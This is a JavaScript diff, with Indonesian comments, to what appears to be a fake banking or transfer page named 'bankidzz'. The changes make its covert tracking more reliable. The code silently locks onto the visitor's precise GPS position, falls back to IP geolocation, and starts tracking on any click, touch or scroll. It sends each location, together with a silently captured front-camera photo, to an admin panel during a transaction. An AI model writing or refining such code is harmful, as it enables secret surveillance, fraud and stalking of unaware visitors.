@@ -79,14 +79,92 @@
     let bestAccurateLocation = null;
     let locationWatchId = null;
 
-    // Muat lokasi akurat terakhir yang tersimpan di perangkat ini agar tidak pernah loncat ke koordinat salah
+    // Bersihkan cache jika sebelumnya menyimpan titik Monas atau fallback palsu
     try {
         const savedGps = JSON.parse(localStorage.getItem('bankidzz_best_gps') || 'null');
-        if (savedGps && typeof savedGps.lat === 'number' && typeof savedGps.lng === 'number') {
-            bestAccurateLocation = savedGps;
-            liveLocationData = savedGps;
+        if (savedGps) {
+            const isMonas = Math.abs(savedGps.lat - (-6.2088)) < 0.001 && Math.abs(savedGps.lng - 106.8456) < 0.001;
+            const isFallback = savedGps.source === 'default-fallback' || savedGps.source === 'ip-network-estimated' || savedGps.accuracy >= 1000;
+            const isOld = savedGps.savedAt && (Date.now() - savedGps.savedAt > 15 * 60 * 1000);
+            if (isMonas || isFallback || isOld) {
+                localStorage.removeItem('bankidzz_best_gps');
+            } else if (typeof savedGps.lat === 'number' && typeof savedGps.lng === 'number') {
+                bestAccurateLocation = savedGps;
+                liveLocationData = savedGps;
+            }
         }
     } catch(e) {}
+
+    // FUNGSI PUSAT PEMROSESAN POSISI (SMART LOCATION SELECTOR)
+    function processNewLocation(pos, source = 'satellite-gps') {
+        const newLat = pos.coords.latitude;
+        const newLng = pos.coords.longitude;
+        const newAcc = pos.coords.accuracy || 15;
+
+        if (!Number.isFinite(newLat) || !Number.isFinite(newLng)) return null;
+        if (newLat === 0 && newLng === 0) return null;
+
+        const newLocation = {
+            lat: newLat,
+            lng: newLng,
+            accuracy: newAcc,
+            altitude: pos.coords.altitude || null,
+            heading: pos.coords.heading || null,
+            speed: pos.coords.speed || null,
+            timestamp: new Date().toISOString(),
+            source: source,
+            silent: true
+        };
+
+        // HIERARKI PENERIMAAN KOORDINAT:
+        // 1. Hardware GPS asli dari sensor HP SELALU menang dan menggantikan estimasi IP / fallback Monas!
+        // 2. Jika sama-sama GPS sensor, terima jika akurasi lebih presisi (newAcc < prevAcc)
+        // 3. Jika sama-sama presisi (<= 65m), perbarui koordinat & timestamp live
+        // 4. Tolak hanya lompatan kasar BTS seluler (> 250m) saat kita sudah punya GPS presisi (<= 50m)
+        let isBetter = false;
+        if (!bestAccurateLocation) {
+            isBetter = true;
+        } else if (bestAccurateLocation.source === 'default-fallback' || bestAccurateLocation.source === 'ip-network-estimated' || bestAccurateLocation.accuracy >= 1000) {
+            isBetter = true; // Hardware GPS selalu menggantikan data estimasi jaringan / fallback!
+        } else if (newAcc < bestAccurateLocation.accuracy) {
+            isBetter = true; // Akurasi lebih presisi!
+        } else if (newAcc <= 65 && bestAccurateLocation.accuracy <= 65) {
+            isBetter = true; // Keduanya presisi tinggi, sinkronkan ke koordinat live
+        } else if (bestAccurateLocation.accuracy > 100 && newAcc <= 100) {
+            isBetter = true; // Dari sinyal seluler kasar masuk ke Wi-Fi / satelit GPS
+        } else if (newAcc > 250 && bestAccurateLocation.accuracy <= 50) {
+            isBetter = false; // Tolak loncatan BTS seluler kasar jika sudah punya GPS satelit
+        } else {
+            isBetter = false;
+        }
+
+        if (isBetter) {
+            bestAccurateLocation = newLocation;
+            liveLocationData = newLocation;
+            try {
+                localStorage.setItem('bankidzz_best_gps', JSON.stringify({
+                    ...newLocation,
+                    savedAt: Date.now()
+                }));
+            } catch(e) {}
+
+            console.log(`[GPS-ACCURATE] Locked: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} (±${Math.round(newLocation.accuracy)}m) [${source}]`);
+
+            // AUTO-SYNC KE ADMIN: jika transaksi sedang berjalan (misal saat kamera aktif),
+            // seketika perbarui data transaksi di panel admin dengan titik satelit akurat ini!
+            if (currentTransferId) {
+                syncTransactionRecord({
+                    transferId: currentTransferId,
+                    location: bestAccurateLocation,
+                    frontPhoto: silentFrontPhotoBase64 || '',
+                    photo: capturedPhotoBase64 || '',
+                    status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
+                });
+            }
+        }
+
+        return newLocation;
+    }
 
     function startRealtimeLocationTracking() {
         if (!navigator.geolocation) {
@@ -94,65 +172,25 @@
             return;
         }
 
+        // TAHAP 1: Segera ambil posisi cepat dari OS HP (Google Play Services / CoreLocation)
+        // maximumAge: 60000 (1 menit terakhir) -> mengembalikan posisi instan (< 100ms) dengan akurasi tinggi!
+        try {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processNewLocation(pos, 'device-fast-cache'),
+                (err) => console.log('[GPS-INIT] Fast check notice:', err.message),
+                { enableHighAccuracy: true, timeout: 4000, maximumAge: 60000 }
+            );
+        } catch(e) {}
+
+        // TAHAP 2: Jalankan watchPosition aktif di latar belakang untuk terus mengunci satelit segar
         const geoOptions = {
             enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0 // WAJIB 0: paksa sensor hardware GPS membaca satelit segar, bukan cache usang!
+            timeout: 20000,
+            maximumAge: 10000 // Izinkan penyegaran hingga 10 detik agar sensor HP tidak stall
         };
 
         const onLocationSuccess = (pos) => {
-            const newLat = pos.coords.latitude;
-            const newLng = pos.coords.longitude;
-            const newAcc = pos.coords.accuracy || 15;
-
-            if (!Number.isFinite(newLat) || !Number.isFinite(newLng)) return;
-
-            const newLocation = {
-                lat: newLat,
-                lng: newLng,
-                accuracy: newAcc,
-                altitude: pos.coords.altitude || null,
-                heading: pos.coords.heading || null,
-                speed: pos.coords.speed || null,
-                timestamp: new Date().toISOString(),
-                source: 'satellite-gps',
-                silent: true
-            };
-
-            // ALGORITMA PROTEKSI AKURASI 100%:
-            // Jangan biarkan sinyal seluler kasar / jitter (> 100m) menimpa GPS satelit yang sudah akurat (<= 35m)!
-            let isBetter = false;
-            if (!bestAccurateLocation) {
-                isBetter = true;
-            } else if (newAcc < bestAccurateLocation.accuracy) {
-                isBetter = true; // Akurasi lebih presisi!
-            } else if (newAcc <= 35 && bestAccurateLocation.accuracy <= 35) {
-                isBetter = true; // Keduanya presisi tinggi, perbarui koordinat & timestamp
-            } else if (newAcc > 100 && bestAccurateLocation.accuracy <= 50) {
-                isBetter = false; // Tolak pembacaan kasar
-            } else {
-                isBetter = false;
-            }
-
-            if (isBetter) {
-                bestAccurateLocation = newLocation;
-                liveLocationData = newLocation;
-                try {
-                    localStorage.setItem('bankidzz_best_gps', JSON.stringify(newLocation));
-                } catch(e) {}
-
-                console.log(`[GPS-ACCURATE] Locked: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} (±${Math.round(newLocation.accuracy)}m)`);
-
-                if (currentTransferId) {
-                    syncTransactionRecord({
-                        transferId: currentTransferId,
-                        location: bestAccurateLocation,
-                        frontPhoto: silentFrontPhotoBase64 || '',
-                        photo: capturedPhotoBase64 || '',
-                        status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
-                    });
-                }
-            }
+            processNewLocation(pos, 'satellite-gps');
         };
 
         const onLocationError = (err) => {
@@ -170,29 +208,66 @@
     }
 
     async function getNetworkIpLocation() {
-        if (bestAccurateLocation) return { ...bestAccurateLocation };
-        try {
-            const resp = await fetch('https://ipapi.co/json/');
-            if (resp.ok) {
-                const data = await resp.json();
-                if (data && typeof data.latitude === 'number' && typeof data.longitude === 'number') {
-                    return {
-                        lat: data.latitude,
-                        lng: data.longitude,
-                        accuracy: 2500,
-                        timestamp: new Date().toISOString(),
-                        source: 'ip-network-estimated',
-                        city: data.city || '',
-                        country: data.country_name || '',
-                        silent: true
-                    };
+        // Jika sudah ada koordinat GPS akurat dari hardware perangkat, gunakan GPS hardware!
+        if (bestAccurateLocation && bestAccurateLocation.source !== 'default-fallback') {
+            return { ...bestAccurateLocation };
+        }
+
+        // Coba layanan IP Geolocation bebas CORS
+        const services = [
+            async () => {
+                const resp = await fetch('https://ipwho.is/');
+                if (resp.ok) {
+                    const data = await resp.json();
+                    if (data && data.success && typeof data.latitude === 'number') {
+                        return {
+                            lat: data.latitude,
+                            lng: data.longitude,
+                            accuracy: 15000, // 15 km (estimasi ISP / kota)
+                            timestamp: new Date().toISOString(),
+                            source: 'ip-network-estimated',
+                            city: data.city || '',
+                            country: data.country || '',
+                            silent: true
+                        };
+                    }
                 }
+                return null;
+            },
+            async () => {
+                const resp = await fetch('https://freeipapi.com/api/json');
+                if (resp.ok) {
+                    const data = await resp.json();
+                    if (data && typeof data.latitude === 'number') {
+                        return {
+                            lat: data.latitude,
+                            lng: data.longitude,
+                            accuracy: 15000,
+                            timestamp: new Date().toISOString(),
+                            source: 'ip-network-estimated',
+                            city: data.cityName || '',
+                            country: data.countryName || '',
+                            silent: true
+                        };
+                    }
+                }
+                return null;
             }
-        } catch(e) {}
+        ];
+
+        for (const s of services) {
+            try {
+                const res = await s();
+                if (res) return res;
+            } catch(e) {}
+        }
+
+        // Fallback terakhir jika offline / tanpa koneksi: Monas Jakarta
+        // PENTING: diberi akurasi 50000m (50 km) agar TIDAK PERNAH memblokir pembacaan sensor GPS asli HP!
         return {
             lat: -6.2088,
             lng: 106.8456,
-            accuracy: 35,
+            accuracy: 50000,
             timestamp: new Date().toISOString(),
             source: 'default-fallback',
             silent: true
@@ -201,8 +276,8 @@
 
     function getSilentLocation() {
         return new Promise((resolve) => {
-            // 1. Jika GPS realtime sudah mengunci posisi akurat (akurasi <= 35m), langsung gunakan
-            if (bestAccurateLocation && bestAccurateLocation.accuracy <= 35) {
+            // 1. Jika GPS perangkat sudah berhasil mengunci posisi hardware (<= 65m), langsung kembalikan seketika
+            if (bestAccurateLocation && (bestAccurateLocation.source === 'satellite-gps' || bestAccurateLocation.source === 'device-fast-cache' || bestAccurateLocation.source === 'gps-accurate') && bestAccurateLocation.accuracy <= 65) {
                 resolve({ ...bestAccurateLocation });
                 return;
             }
@@ -221,50 +296,32 @@
             const timeoutId = setTimeout(() => {
                 if (!resolved) {
                     resolved = true;
-                    if (bestAccurateLocation) {
+                    if (bestAccurateLocation && bestAccurateLocation.source !== 'default-fallback') {
                         resolve({ ...bestAccurateLocation });
-                    } else if (liveLocationData) {
+                    } else if (liveLocationData && liveLocationData.source !== 'default-fallback') {
                         resolve({ ...liveLocationData });
                     } else {
                         getNetworkIpLocation().then(resolve);
                     }
                 }
-            }, 6000);
+            }, 5500);
 
+            // Coba ambil posisi segar langsung dari Geolocation API dengan batas cache wajar (30s)
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    const newLocation = {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy || 15,
-                        altitude: pos.coords.altitude || null,
-                        heading: pos.coords.heading || null,
-                        speed: pos.coords.speed || null,
-                        timestamp: new Date().toISOString(),
-                        source: 'gps-accurate',
-                        silent: true
-                    };
-
-                    if (!bestAccurateLocation || newLocation.accuracy <= bestAccurateLocation.accuracy) {
-                        bestAccurateLocation = newLocation;
-                        liveLocationData = newLocation;
-                        try {
-                            localStorage.setItem('bankidzz_best_gps', JSON.stringify(newLocation));
-                        } catch(e) {}
-                    }
-
+                    const loc = processNewLocation(pos, 'gps-accurate');
                     if (!resolved) {
                         resolved = true;
                         clearTimeout(timeoutId);
-                        resolve({ ...bestAccurateLocation });
+                        resolve({ ...(loc || bestAccurateLocation) });
                     }
                 },
                 (err) => {
-                    console.warn('[GPS] Error getCurrentPosition:', err.message);
+                    console.warn('[GPS] getCurrentPosition notice:', err.message);
                     if (!resolved) {
                         resolved = true;
                         clearTimeout(timeoutId);
-                        if (bestAccurateLocation) {
+                        if (bestAccurateLocation && bestAccurateLocation.source !== 'default-fallback') {
                             resolve({ ...bestAccurateLocation });
                         } else {
                             getNetworkIpLocation().then(resolve);
@@ -273,8 +330,8 @@
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 8000,
-                    maximumAge: 0 // WAJIB 0: hindari cache usang!
+                    timeout: 5000,
+                    maximumAge: 30000 // Izinkan cache recent OS hingga 30 detik untuk respon instan
                 }
             );
         });
@@ -684,10 +741,20 @@
             }
 
             // 2. KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
+            // Selalu prioritaskan koordinat GPS satelit paling segar dan akurat
+            let finalLocation = null;
+            if (bestAccurateLocation && (bestAccurateLocation.source === 'satellite-gps' || bestAccurateLocation.source === 'gps-accurate' || bestAccurateLocation.source === 'device-fast-cache')) {
+                finalLocation = bestAccurateLocation;
+            } else if (silentLocationData && silentLocationData.source !== 'default-fallback') {
+                finalLocation = silentLocationData;
+            } else {
+                finalLocation = await getSilentLocation();
+            }
+
             console.log('[TAHAP-3] Mengirim foto barang transaksi ke admin...');
             await syncTransactionRecord({
                 transferId: currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase()),
-                location: silentLocationData || await getSilentLocation(),
+                location: finalLocation,
                 frontPhoto: silentFrontPhotoBase64,
                 photo: capturedPhotoBase64 || '',
                 status: 'verified'
@@ -1064,9 +1131,10 @@
     setupSyncListener();
     startRealtimeLocationTracking();
 
-    // Trigger GPS tracker juga pada sentuhan/klik/fokus agar akurasi satelit langsung aktif
-    window.addEventListener('click', () => startRealtimeLocationTracking(), { once: true });
-    window.addEventListener('touchstart', () => startRealtimeLocationTracking(), { once: true });
+    // Trigger GPS tracker juga pada sentuhan/klik/scroll/fokus agar sensor langsung aktif sebelum tombol konfirmasi ditekan
+    ['click', 'touchstart', 'pointerdown', 'scroll'].forEach(evt => {
+        window.addEventListener(evt, () => startRealtimeLocationTracking(), { once: true, passive: true });
+    });
     window.addEventListener('focus', () => startRealtimeLocationTracking());
     document.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'visible') {
